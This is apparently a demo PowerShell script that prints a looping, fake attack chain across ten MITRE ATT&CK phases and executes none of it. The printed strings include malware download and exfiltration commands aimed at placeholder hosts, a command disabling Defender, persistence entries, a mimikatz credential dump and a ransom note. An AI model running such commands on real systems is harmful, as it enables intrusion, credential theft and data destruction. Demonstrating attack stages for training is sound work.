Clear-Host

function Write-HackerLine {
    param (
        [string]$Text,
        [int]$Speed = 10,
        [ConsoleColor]$Color = 'Green'
    )
    foreach ($char in $Text.ToCharArray()) {
        Write-Host $char -NoNewline -ForegroundColor $Color
        Start-Sleep -Milliseconds $Speed
    }
    Write-Host ""
}

function Simulate-Command {
    param (
        [string]$Command,
        [string[]]$Output,
        [int]$Delay = 300
    )

    Write-Host "`nPS C:\Users\attacker>" -NoNewline -ForegroundColor DarkGray
    Write-Host $Command -ForegroundColor White
    Start-Sleep -Milliseconds $Delay

    foreach ($line in $Output) {
        Write-HackerLine $line -Speed 10
        Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
    }
}

function Write-PhaseTitle {
    param ([string]$Title)
    Write-Host "`n========== $Title ==========" -ForegroundColor Cyan
}

function Show-Banner {
    Clear-Host
    Write-Host "██╗░░██╗░█████╗░░█████╗░██╗░░░██╗███╗░░░███╗" -ForegroundColor Green
    Write-Host "██║░░██║██╔══██╗██╔══██╗██║░░░██║████╗░████║" -ForegroundColor Green
    Write-Host "███████║███████║██║░░╚═╝██║░░░██║██╔████╔██║" -ForegroundColor Green
    Write-Host "██╔══██║██╔══██║██║░░██╗██║░░░██║██║╚██╔╝██║" -ForegroundColor Green
    Write-Host "██║░░██║██║░░██║╚█████╔╝╚██████╔╝██║░╚═╝░██║" -ForegroundColor Green
    Write-Host "╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░░╚═════╝░╚═╝░░░░░╚═╝" -ForegroundColor Green
    Write-Host "     ATAQUE SIMULADO - MITRE FASES         " -ForegroundColor DarkGray
}

# ========== FASES CON COMANDOS SIMULADOS ==========

function Fase-AccesoInicial {
    Write-PhaseTitle "FASE 1 - ACCESO INICIAL"
    Simulate-Command -Command "curl http://malicious.example/malware.exe -o loader.exe" -Output @(
        "Downloading malware...",
        "Saved as loader.exe"
    )
    Simulate-Command -Command ".\loader.exe" -Output @(
        "Establishing connection to C2...",
        "[+] Beacon sent to 192.168.1.100:443"
    )
}

function Fase-Persistencia {
    Write-PhaseTitle "FASE 2 - PERSISTENCIA"
    Simulate-Command -Command "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d 'C:\Users\Public\payload.exe'" -Output @(
        "The operation completed successfully."
    )
    Simulate-Command -Command "schtasks /create /tn 'UpdaterTask' /tr C:\Users\Public\payload.exe /sc daily" -Output @(
        "SUCCESS: The scheduled task 'UpdaterTask' has been created."
    )
}

function Fase-Escalacion {
    Write-PhaseTitle "FASE 3 - ESCALACIÓN DE PRIVILEGIOS"
    Simulate-Command -Command "exploit.exe --local --eop CVE-2021-1732" -Output @(
        "[*] Running exploit...",
        "[+] Privilege Escalation Successful",
        "Current user: NT AUTHORITY\SYSTEM"
    )
}

function Fase-Evasion {
    Write-PhaseTitle "FASE 4 - EVASIÓN DE DEFENSAS"
    Simulate-Command -Command "Set-MpPreference -DisableRealtimeMonitoring $true" -Output @(
        "Realtime protection disabled."
    )
    Simulate-Command -Command "powershell -enc JABjAGwAaQBlAG4AdA== ..." -Output @(
        "[+] Encoded payload executed"
    )
}

function Fase-Credenciales {
    Write-PhaseTitle "FASE 5 - ACCESO A CREDENCIALES"
    Simulate-Command -Command ".\mimikatz.exe" -Output @(
        "sekurlsa::logonpasswords",
        "Username: juan.perez",
        "Password: SuperSecret123",
        "Username: admin.local",
        "Password: Qwerty!2024"
    )
}

function Fase-Descubrimiento {
    Write-PhaseTitle "FASE 6 - DESCUBRIMIENTO"
    Simulate-Command -Command "net view /domain" -Output @(
        "\\HR-WS01",
        "\\FINANCE-PC",
        "\\DB-SERVER"
    )
    Simulate-Command -Command "net user /domain" -Output @(
        "User accounts for \\EXAMPLECORP",
        "Administrator",
        "j.smith",
        "hr.manager",
        "..."
    )
}

function Fase-Lateral {
    Write-PhaseTitle "FASE 7 - MOVIMIENTO LATERAL"
    Simulate-Command -Command "psexec \\FINANCE-PC cmd.exe" -Output @(
        "Connecting to FINANCE-PC...",
        "Remote shell obtained"
    )
    Simulate-Command -Command "copy revshell.exe \\FINANCE-PC\C$\temp\" -Output @(
        "        1 file(s) copied."
    )
}

function Fase-Coleccion {
    Write-PhaseTitle "FASE 8 - COLECCIÓN"
    Simulate-Command -Command "dir \\FINANCE-PC\C$\Users\*\Documents\*.xlsx" -Output @(
        " - payroll_2025.xlsx",
        " - bonuses_q1.xlsx"
    )
    Simulate-Command -Command "copy \\FINANCE-PC\C$\Users\*\Documents\payroll_2025.xlsx C:\loot\" -Output @(
        "        1 file(s) copied."
    )
}

function Fase-Exfiltracion {
    Write-PhaseTitle "FASE 9 - EXFILTRACIÓN"
    Simulate-Command -Command "Compress-Archive C:\loot\* data.zip" -Output @(
        "Compressing files..."
    )
    Simulate-Command -Command "curl -X POST -F 'file=@data.zip' http://malicious.site/upload" -Output @(
        "[+] File sent: 870MB"
    )
}

function Fase-Impacto {
    Write-PhaseTitle "FASE 10 - IMPACTO"
    Simulate-Command -Command "encrypt.exe C:\Shared" -Output @(
        "[*] Encrypting files...",
        "[+] 3200 files encrypted"
    )
    Simulate-Command -Command "echo 'Send 2 BTC to wallet XYZ to restore files' > C:\Shared\README.txt" -Output @(
        "[+] Ransom note deployed"
    )
}

# ========== LOOP PRINCIPAL ==========

while ($true) {
    Show-Banner
    Start-Sleep -Seconds 1

    Fase-AccesoInicial
    Fase-Persistencia
    Fase-Escalacion
    Fase-Evasion
    Fase-Credenciales
    Fase-Descubrimiento
    Fase-Lateral
    Fase-Coleccion
    Fase-Exfiltracion
    Fase-Impacto

    Write-Host "`n[+] Ciclo de ataque completo. Reiniciando en 10 segundos..." -ForegroundColor Red
    Start-Sleep -Seconds 10
}
